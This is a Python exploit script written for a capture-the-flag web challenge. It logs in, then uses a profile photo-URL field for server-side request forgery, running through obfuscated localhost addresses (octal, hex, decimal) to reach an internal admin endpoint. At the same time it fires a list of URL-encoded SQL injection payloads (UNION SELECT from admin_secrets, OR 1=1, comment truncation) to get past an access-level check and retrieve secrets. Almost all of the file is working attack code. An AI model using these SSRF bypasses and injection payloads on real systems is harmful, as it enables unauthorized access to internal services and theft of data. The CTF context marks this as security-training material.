#!/usr/bin/env python3
import requests
import urllib.parse

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "sql_bypass"
    password = "sql123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def advanced_sql_bypass():
    """Advanced SQL injection bypass techniques"""
    print("[+] Advanced SQL Injection Bypass")
    print("[+] =============================")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Advanced SQL injection payloads with different bypass techniques
    sql_payloads = [
        # URL encoding bypass
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level=3--",
        "access_level%27%20OR%20access_level=3--",
        "access_level%27%20OR%20access_level>2--",
        "access_level%27%20OR%20access_level>=3--",
        
        # Double URL encoding
        "access_level%2527%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level=3--",
        "access_level%2527%20OR%20access_level=3--",
        
        # Hex encoding
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets--",
        "access_level%27%20OR%20access_level=3--",
        
        # Try to bypass the access_level <= 2 restriction by modifying the query
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level>2--",
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level>=3--",
        
        # Try to comment out the AND access_level <= 2 part
        "access_level%27--",
        "access_level%27/*",
        "access_level%27/**/",
        
        # Try to inject OR to bypass the restriction
        "access_level%27%20OR%20%271%27=%271%27--",
        "access_level%27%20OR%201=1--",
        
        # Try to inject AND to modify the condition
        "access_level%27%20AND%20access_level=3--",
        "access_level%27%20AND%20access_level>2--",
        
        # Try to inject OR to bypass the LIKE clause entirely
        "access_level%27%20OR%20secret_name%20LIKE%20%27%25%27--",
        "access_level%27%20OR%201=1%20OR%20secret_name%20LIKE%20%27%25%27--",
        
        # Try to inject UNION to get all secrets
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets--",
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level=3--",
        
        # Try to inject OR to modify the access_level condition
        "access_level%27%20OR%20access_level=3--",
        "access_level%27%20OR%20access_level>2--",
        "access_level%27%20OR%20access_level>=3--",
    ]
    
    # Try different localhost representations
    localhost_urls = [
        "http://127.0.0.1:5000/internal/admin/search",
        "http://localhost:5000/internal/admin/search",
        "http://0.0.0.0:5000/internal/admin/search",
        "http://0177.0.0.1:5000/internal/admin/search",  # Octal
        "http://2130706433:5000/internal/admin/search",  # Decimal
        "http://0x7f.0x0.0x0.0x1:5000/internal/admin/search",  # Hex
        "http://017700000001:5000/internal/admin/search",  # Combined octal
        "http://127.1:5000/internal/admin/search",  # Shortened
        "http://127.0.1:5000/internal/admin/search",  # Alternative
    ]
    
    print("[+] Testing advanced SQL injection bypasses...")
    
    for base_url in localhost_urls:
        print(f"[*] Trying base URL: {base_url}")
        
        for sql_payload in sql_payloads:
            full_url = f"{base_url}?q={sql_payload}"
            
            print(f"[*] Testing: {full_url}")
            
            data = {'photo_url': full_url}
            
            try:
                response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
                
                if response.status_code == 200:
                    # Check for flag in response
                    if "COMPFEST" in response.text:
                        print(f"[+] SUCCESS! Found flag!")
                        print(f"[+] Response: {response.text}")
                        return
                    
                    # Check error preview
                    if "Failed to render as image" in response.text:
                        start = response.text.find("<pre>")
                        end = response.text.find("</pre>")
                        if start != -1 and end != -1:
                            preview = response.text[start+5:end]
                            if "COMPFEST" in preview or "Flag" in preview:
                                print(f"[+] SUCCESS! Found flag in error preview!")
                                print(f"[+] Preview: {preview}")
                                return
                            elif "Access denied" not in preview and "Error" not in preview:
                                print(f"[+] Got interesting response: {preview[:200]}")
                
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
    
    print("[-] Advanced SQL injection attempts failed.")
    
    # Try a different approach: maybe the flag is in the secrets with access_level <= 2
    print("[+] Trying to get all secrets with access_level <= 2...")
    
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            # Visit profile page to see the content
            profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
            
            if profile_response.status_code == 200:
                if "Failed to render as image" in profile_response.text:
                    start = profile_response.text.find("<pre>")
                    end = profile_response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = profile_response.text[start+5:end]
                        print(f"[+] Got secrets with access_level <= 2:")
                        print(f"[+] {preview}")
                        
                        if "COMPFEST" in preview:
                            print("[+] SUCCESS! Found flag!")
                            return
                        elif "Flag" in preview:
                            print("[+] Found flag reference!")
                            return
                        else:
                            print("[+] Got secrets but no flag yet...")
                else:
                    print("[+] No error preview found")
    
    except Exception as e:
        print(f"[-] Error: {e}")
    
    print("[-] All attempts failed.")

if __name__ == "__main__":
    advanced_sql_bypass()
